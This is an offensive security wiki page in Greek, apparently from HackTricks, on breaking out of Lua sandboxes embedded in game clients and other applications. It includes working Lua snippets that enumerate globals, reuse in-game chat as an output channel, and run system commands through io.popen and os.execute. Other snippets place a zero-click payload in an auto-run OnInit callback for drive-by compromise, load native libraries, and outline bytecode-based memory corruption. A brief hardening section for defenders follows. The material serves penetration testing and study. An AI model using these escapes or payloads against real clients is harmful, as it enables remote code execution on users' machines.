# Παράκαμψη Lua sandboxes (embedded VMs, game clients)

Αυτή η σελίδα συγκεντρώνει πρακτικές τεχνικές για την απαρίθμηση και την έξοδο από Lua "sandboxes" που είναι ενσωματωμένα σε εφαρμογές (κυρίως game clients, plugins ή in-app scripting engines). Πολλές engines εκθέτουν ένα περιορισμένο περιβάλλον Lua, αλλά αφήνουν προσβάσιμα ισχυρά globals που επιτρέπουν την αυθαίρετη εκτέλεση εντολών ή ακόμη και native memory corruption όταν εκτίθενται bytecode loaders.

Βασικές ιδέες:
- Αντιμετωπίστε το VM ως άγνωστο περιβάλλον: απαριθμήστε το _G και ανακαλύψτε ποια επικίνδυνα primitives είναι προσβάσιμα.
- Όταν τα stdout/print είναι αποκλεισμένα, καταχραστείτε οποιοδήποτε in-VM UI/IPC channel ως output sink για να παρατηρείτε τα αποτελέσματα.
- Αν εκτίθενται τα io/os, συχνά έχετε άμεση command execution (io.popen, os.execute).
- Αν εκτίθενται τα load/loadstring/loadfile, η εκτέλεση κατασκευασμένου Lua bytecode μπορεί να παρακάμψει την memory safety σε ορισμένες versions (οι verifiers της ≤5.1 μπορούν να παρακαμφθούν· η 5.2 αφαίρεσε τον verifier), επιτρέποντας advanced exploitation.

## Απαρίθμηση του sandboxed περιβάλλοντος

- Κάντε dump το global environment για να καταγράψετε τα προσβάσιμα tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Αν δεν είναι διαθέσιμη η `print()`, επαναχρησιμοποιήστε κανάλια εντός του VM. Παράδειγμα από ένα VM script στέγασης MMO, όπου η έξοδος συνομιλίας λειτουργεί μόνο μετά από ένα sound call· το παρακάτω δημιουργεί μια αξιόπιστη συνάρτηση εξόδου:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Γενικεύστε αυτό το μοτίβο για τον στόχο σας: οποιοδήποτε textbox, toast, logger ή UI callback που δέχεται strings μπορεί να λειτουργήσει ως stdout για reconnaissance.

## Άμεση εκτέλεση εντολών αν εκτίθεται το io/os

Αν το sandbox εξακολουθεί να εκθέτει τις standard libraries io ή os, πιθανότατα έχετε άμεση εκτέλεση εντολών:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Σημειώσεις:

- Η εκτέλεση πραγματοποιείται μέσα στη διεργασία του client· πολλά επίπεδα anti-cheat/antidebug που αποκλείουν εξωτερικούς debuggers δεν θα εμποδίσουν τη δημιουργία διεργασιών μέσα στο VM.
- Ελέγξτε επίσης: `package.loadlib` (φόρτωση αυθαίρετων DLL/.so), `require` με native modules, το `ffi` του LuaJIT (αν υπάρχει) και τη debug library (μπορεί να αυξήσει τα privileges μέσα στο VM).

## Zero-click triggers μέσω auto-run callbacks

Αν η host εφαρμογή προωθεί scripts στους clients και το VM εκθέτει auto-run hooks (π.χ. OnInit/OnLoad/OnEnter), τοποθετήστε εκεί το payload σας για drive-by compromise αμέσως μόλις φορτωθεί το script:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Οποιοδήποτε αντίστοιχο callback (OnLoad, OnEnter κ.λπ.) γενικεύει αυτή την τεχνική όταν τα scripts μεταδίδονται και εκτελούνται αυτόματα στον client.

## Επικίνδυνα primitives που πρέπει να αναζητήσετε κατά το recon

Κατά την απαρίθμηση του _G, αναζητήστε συγκεκριμένα:
- io, os: io.popen, os.execute, file I/O, πρόσβαση στο env.
- load, loadstring, loadfile, dofile: εκτέλεση source ή bytecode· υποστηρίζει τη φόρτωση μη αξιόπιστου bytecode.
- package, package.loadlib, require: φόρτωση dynamic libraries και επιφάνεια module.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo και hooks.
- Μόνο στο LuaJIT: ffi.cdef, ffi.load για άμεση κλήση native code.

Ελάχιστα παραδείγματα χρήσης (αν είναι προσβάσιμα):

Το API του loader της Lua άλλαξε μεταξύ των εκδόσεων: στη Lua 5.1, το `load` διαβάζει από μια reader function και το `loadstring` διαβάζει από ένα string· το `load` της Lua 5.2 δέχεται είτε string είτε reader function, ενώ το `loadstring` είναι deprecated ως ισοδύναμό του.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Προαιρετική κλιμάκωση: κατάχρηση Lua bytecode loaders

Όταν τα load/loadstring/loadfile είναι προσβάσιμα αλλά τα io/os είναι περιορισμένα, η εκτέλεση κατασκευασμένου Lua bytecode μπορεί να οδηγήσει σε primitives αποκάλυψης και καταστροφής μνήμης. Βασικά facts:
- Το Lua ≤ 5.1 περιλάμβανε bytecode verifier με γνωστά bypasses.<sup>[[4]](#references)</sup>
- Το Lua 5.2 αφαίρεσε πλήρως τον verifier (επίσημη θέση: οι εφαρμογές θα πρέπει απλώς να απορρίπτουν precompiled chunks), διευρύνοντας την επιφάνεια επίθεσης αν η φόρτωση bytecode δεν απαγορεύεται.<sup>[[2]](#references)[[3]](#references)</sup>
- Τα workflows συνήθως περιλαμβάνουν: leak pointers μέσω output εντός του VM, κατασκευή bytecode για δημιουργία type confusions (π.χ. γύρω από το FORLOOP ή άλλα opcodes) και, στη συνέχεια, pivot σε arbitrary read/write ή native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Αυτή η διαδρομή εξαρτάται από τη συγκεκριμένη engine/version και απαιτεί RE. Δείτε τις references για λεπτομερείς αναλύσεις, exploitation primitives και παραδείγματα gadgetry σε games.

## Σημειώσεις detection και hardening (για defenders)

- Server side: απορρίπτετε ή ξαναγράφετε user scripts· επιτρέπετε μόνο safe APIs μέσω allowlist· αφαιρείτε ή κάνετε bind-empty τα io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: εκτελείτε το Lua με minimal _ENV, απαγορεύετε τη φόρτωση bytecode, επαναφέρετε έναν strict bytecode verifier ή signature checks και αποκλείετε τη δημιουργία processes από το client process.
- Telemetry: δημιουργήστε alert για gameclient → child process creation λίγο μετά τη φόρτωση script· συσχετίστε το με UI/chat/script events.

## References

- [1] [Αυτό το σπίτι είναι στοιχειωμένο: ένα RCE δεκαετίας στον AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Ανάλυση bytecode: Αποκρυπτογραφώντας τα security flaws του Lua στο Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Συζήτηση για την αφαίρεση του bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist με verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Εγχειρίδιο αναφοράς Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Εγχειρίδιο αναφοράς Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
